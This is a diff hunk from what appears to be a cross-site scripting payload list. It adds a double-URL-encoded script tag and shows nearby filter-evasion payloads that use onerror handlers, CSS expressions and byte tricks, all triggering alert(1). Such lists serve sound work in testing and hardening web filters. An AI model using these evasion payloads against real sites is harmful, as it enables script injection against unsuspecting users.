@@ -143,6 +143,7 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 <style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
 "'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
 "'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
+%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
 <script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
 <script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
 <script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
